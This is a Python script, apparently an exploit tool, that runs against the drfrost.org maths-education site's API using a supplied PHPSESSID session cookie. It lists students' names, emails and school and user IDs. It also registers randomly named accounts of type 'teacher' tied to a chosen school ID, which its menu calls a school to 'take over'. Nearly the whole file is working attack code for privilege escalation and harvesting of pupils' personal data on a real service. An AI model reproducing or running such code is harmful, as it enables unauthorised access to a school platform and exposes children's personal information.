import requests
import random
import string



def display_children(phpsessid):
    get_url = "https://www.drfrost.org/api/class/class/children"
    headers = {
        "Cookie":f'PHPSESSID={phpsessid}',
        "Origin":"https://www.drfrost.org",
        "User-Agent":'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        "X-Requested-With":"XMLHttpRequest",
        "Accept-Encoding": "gzip, deflate, br, zstd"}
    userIDs = requests.get(url=get_url,headers=headers).json()
    students = userIDs["_students"]

    all_ids = [students[i]["uid"] for i in range(len(students))]
    all_emails = [students[i]["email"] for i in range(len(students))]
    all_firstnames = [students[i]["firstname"] for i in range(len(students))]
    all_surnames = [students[i]["surname"] for i in range(len(students))]
    all_uids = [students[i]["uid"] for i in range(len(students))]
    all_sids = [students[i]["sid"] for i in range(len(students))]
    print("\n\n")
    for i in range(len(all_ids)):
        print(f"Firstname:{all_firstnames[i]}  |  Surname:{all_surnames[i]}  |  Email:{all_emails[i]}  |  SID:{all_sids[i]}  |  UID:{all_uids[i]}")
    print("\n\n")


def create_active_child(target_sid, cid, phpsessid):
    make_url = "https://www.drfrost.org/api/auth/register/manual/"
    headers = {
        "Cookie":f'PHPSESSID={phpsessid}',
        "Origin":"https://www.drfrost.org",
        "User-Agent":'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        "X-Requested-With":"XMLHttpRequest",
        "Accept-Encoding": "gzip, deflate, br, zstd"}
    firstname = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
    surname = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
    email = f"{''.join(random.choices(string.ascii_letters + string.digits, k=5))}@{''.join(random.choices(string.ascii_letters + string.digits, k=5))}.com" 
    payload = {"firstname":firstname,
               "surname":surname,
               "email":email,
               "type":"teacher",
               "cid":f"{cid}",
               "sid":target_sid}
    r = requests.post(make_url,headers=headers,json=payload)
    print(r.status_code)


phpsessid = "" #enter phpsessid of the "controller" parent account
cid = 0 # enter class ID from the "controller" parent account (found in url)


print("""
   ____      _______  
  |    \    |  _____| 
  |  _  \   | |_____  
  | | \  \  | |_____| 
  | |_/  /  | |       
  |     /   | |       
  |____/    |_|       
  """)

while True:
    choice = int(input("1) List child accounts\n2) Create an unnasigned account\n3) Create an account assigned to a specific school (school ID needed)\n4) Set Details\n5) Quit\nWhat would you like to do?"))
    if choice == 1:
        display_children(phpsessid)
    elif choice == 2:
        create_active_child(None,cid,phpsessid)
    elif choice == 3:
        sid = input("Enter SID to take over: ")
        create_active_child(sid,cid,phpsessid)
    elif choice == 4:
        phpsessid = input(f"Current PHPSESSID is {phpsessid}. Enter your new PHPSESSID: ")
        cid = input(f"Current CID is {cid}.Enter your new CID (found in url bar): ")
        print("Values modified successfully.")
    elif choice == 5:
        print("Thanks for using!")
        quit()
